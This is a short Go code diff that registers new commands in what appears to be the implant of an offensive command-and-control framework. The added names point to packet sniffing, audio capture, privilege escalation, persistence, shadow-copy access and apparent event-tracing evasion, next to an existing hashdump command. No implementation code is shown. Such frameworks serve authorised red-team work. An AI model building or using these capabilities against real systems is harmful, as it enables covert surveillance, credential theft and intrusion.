@@ -35,4 +35,12 @@ func registerPlatformCommands() {
 	RegisterCommand(&LogonSessionsCommand{})
 	RegisterCommand(&EventLogCommand{})
 	RegisterCommand(&HashdumpCommand{})
+	RegisterCommand(&AmcacheCommand{})
+	RegisterCommand(&SniffCommand{})
+	RegisterCommand(&AudioCaptureCommand{})
+	RegisterCommand(&LolbinCommand{})
+	RegisterCommand(&EtwCommand{})
+	RegisterCommand(&GetSystemCommand{})
+	RegisterCommand(&VSSCommand{})
+	RegisterCommand(&PersistCommand{})
 }
